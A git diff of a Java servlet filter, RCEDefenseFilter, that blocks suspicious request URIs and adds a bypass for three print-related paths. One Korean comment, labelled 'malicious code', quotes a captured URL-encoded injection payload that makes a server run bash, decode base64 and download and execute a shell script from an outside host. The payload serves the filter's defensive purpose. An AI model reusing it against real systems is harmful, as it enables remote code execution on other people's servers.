@@ -13,15 +13,17 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Objects;
 
 @Component
 @RequiredArgsConstructor
 /**
- * 불분명한 요청은 서블릿 필터로 톰캣에 들어오기 전 차단
+ * 불분명한 요청은 컨트롤러로 가기 전 서블릿 필터로 차단
  * */
 
 public class RCEDefenseFilter implements Filter {
 
+    // 빈 지연시키기 lazy-loading
     private final ObjectProvider<UserService> userServiceProvider;
 
     @Override
@@ -39,12 +41,15 @@ public class RCEDefenseFilter implements Filter {
         //악성코드 > http://158.247.254.218:8090/$%257Bnew%2520javax.script.ScriptEngineManager%2528%2529.getEngineByName%2528%2522nashorn%2522%2529.eval%2528%2522new%2520java.lang.ProcessBuilder%2528%2529.command%2528%2527bash%2527%252C%2527-c%2527%252C%2527echo%2520dnVybCgpIHsKCUlGUz0vIHJlYWQgLXIgcHJvdG8geCBob3N0IHF1ZXJ5IDw8PCIkMSIKICAgIGV4ZWMgMzw%252BIi9kZXYvdGNwLyR7aG9zdH0vJHtQT1JUOi04MH0iCiAgICBlY2hvIC1lbiAiR0VUIC8ke3F1ZXJ5fSBIVFRQLzEuMFxyXG5Ib3N0OiAke2hvc3R9XHJcblxyXG4iID4mMwogICAgKHdoaWxlIHJlYWQgLXIgbDsgZG8gZWNobyA%252BJjIgIiRsIjsgW1sgJGwgPT0gJCdccicgXV0gJiYgYnJlYWs7IGRvbmUgJiYgY2F0ICkgPCYzCiAgICBleGVjIDM%252BJi0KfQp2dXJsIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai93LnNofGJhc2gK%257Cbase64%2520-d%257Cbash%2527%2529.start%2528%2529%2522%2529%257D/
         /**
          * 필터에서 막히면 요청 로그로 /error만 남는다. (필터에서 걸러도 인터셉터까지 error요청이 간다)
-         * 필터보다 더 앞 (톰캣단) 에서 400에러로 막히면 당연히 로그가 남지않음
-         *
-         * */
+         */
 
-        if (requestURI.length() >= 30 || requestURI.matches(".*[';\"].*") ||
-                requestURI.contains("!") || //정규식으로하니까 안먹음("/")
+        if (requestURI.startsWith("/inbOrderPrint") || requestURI.startsWith("/outOrderPrint") ||
+                requestURI.startsWith("/stockPrint")) {
+            chain.doFilter(request, response);
+        }
+
+        else if (requestURI.length() >= 30 || requestURI.matches(".*[';\"].*") ||
+                requestURI.contains("!") || //정규식으로하니까 안먹어서..("/")
                 requestURI.contains("@") ||
                 requestURI.contains("#") ||
                 requestURI.contains("$") ||
